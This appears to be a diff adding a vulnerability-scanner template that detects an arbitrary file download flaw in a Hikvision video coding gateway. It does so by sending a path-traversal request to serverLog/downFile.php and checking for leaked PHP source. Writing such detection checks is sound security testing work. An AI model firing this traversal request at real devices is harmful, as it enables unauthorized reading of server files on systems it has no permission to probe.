@@ -1,0 +1,25 @@
+id: hikvision-video-coding-equipment-access-gateway-arbitrary-file-download
+
+info:
+  name: HIKVISION 视频编码设备接入网关
+  author: Master先生
+  severity: high
+  reference:
+    - https://blockchain.seebug.org/vuldb/ssvid-91769
+  tags: hikvision,download
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php"
+
+    redirects: false
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code==200"
+          - "contains((body), 'fileName')"
+          - "contains((body), '<?php')"
+        condition: and
